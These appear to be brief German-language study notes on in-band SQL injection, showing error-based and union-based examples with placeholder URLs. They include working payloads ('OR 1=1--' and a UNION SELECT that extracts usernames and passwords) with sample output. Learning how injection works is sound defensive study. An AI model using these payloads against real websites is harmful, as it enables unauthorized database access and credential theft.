Zu unterscheiden in "Error Based" oder "Union Based".

# Error-Based
```sql
// Input
www.random.com/app.php?id =' // Das Hochkomma 
// Output
You have an error in your SQL syntax...
```
Weitere In-Band Attacken
```sql
https://insecure-website.com/products?category=Gifts'+OR+1=1--
//White-Box
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1 
```

# Union-Based
```sql
// Input
www.random.com/app.php?id =' UNION SELECT username, password FROM users \--
// Output
carlos
asdklsdf
administrator
asjklhnöshf
```
